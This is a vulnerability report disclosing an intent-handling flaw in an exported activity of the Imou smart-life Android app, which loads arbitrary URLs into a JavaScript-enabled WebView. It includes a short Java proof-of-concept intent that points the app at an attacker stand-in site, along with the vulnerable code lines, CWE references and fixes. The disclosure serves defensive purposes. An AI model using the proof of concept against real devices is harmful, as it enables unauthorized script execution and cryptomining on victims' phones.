## Vulnerability Report 

### Introduction:
This vulnerability report outlines a security flaw identified in the `com.mm.android.smartlifeiot` app's exported activity: `com.mm.android.easy4ip.MainActivity`.

A remote attacker can execute arbitrary code via insecure intent handling.


### Affected Component:
Activity: `com.mm.android.easy4ip.MainActivity`  
App: `com.mm.android.smartlifeiot`

### Vulnerability Description:

The com.mm.android.easy4ip.MainActivity activity within the com.mm.android.smartlifeiot app blindly loads URLs provided through intent data. 

A malicious third-party app can exploit this oversight to trigger the loading of malicious web content, initiating unauthorized JavaScript web browser mining operations or remote code execution within the WebView.

**No permissions are required by 3rd party app.**

### Proof of Concept:

 ![image](https://github.com/actuator/imou/blob/main/pocGIF.gif)
 
A third-party malicious app (`com.example.d3m0`) can craft and launch an intent targeting `com.mm.android.easy4ip.MainActivity` as follows:


Intent intent = new Intent();
intent.setComponent(new ComponentName("com.mm.android.smartlifeiot", "com.mm.android.easy4ip.MainActivity"));
intent.putExtra("url", "imoulife://http://maliciouswebsitetest.com");
startActivity(intent);


Upon executing this code, `com.mm.android.easy4ip.MainActivity` would be triggered to load the content from `http://maliciouswebsitetest.com`.

### Code Snippets:

1. In the `com.mm.android.easy4ip.MainActivity`, URLs are loaded directly from intent data without adequate validation:
   
**this.url = getIntent().getExtras().getString("url");**


2. JavaScript execution is enabled in the WebView:

**this.webView.getSettings().setJavaScriptEnabled(true);**

3. Direct web content loading with the fetched URL:

**progressWebView.loadUrl(str);**


### Impact:

An attacker can exploit this vulnerability to:

Execute arbitrary JavaScript within the app's context, leading to remote code execution.

Start unauthorized web browser mining operations, consuming device resources and potentially earning cryptocurrency for the attacker.

Access the internet from a victim's device without necessary permissions in the malicious app's manifest.

### MITRE CWE References:

- [CWE-94: Improper Control of Generation of Code ('Code Injection')](https://cwe.mitre.org/data/definitions/94.html): The vulnerability can potentially allow attackers to inject arbitrary code.
- [CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')](https://cwe.mitre.org/data/definitions/95.html): With JavaScript enabled, an attacker could potentially inject malicious scripts.

### Recommendations:

1. **Intent Data Validation**: Ensure that all intent data, especially URLs, are adequately validated before use.
2. **Disable JavaScript (if not needed)**: If the application does not require JavaScript execution within the WebView, it should be disabled.
3. **Use Web Content Filtering**: Implement a whitelist of allowed domains or URLs that can be loaded in the WebView.
4. **Flag Non-Exported**: If the MainActivity is not intended to be used by third-party apps, ensure that it's flagged as non-exported in the manifest.

 TLDR: **Set Exported='False'**
 ![image](https://github.com/actuator/imou/assets/78701239/ca4d4e27-3d5d-4a49-8fd9-2a7e60e29c37)



 
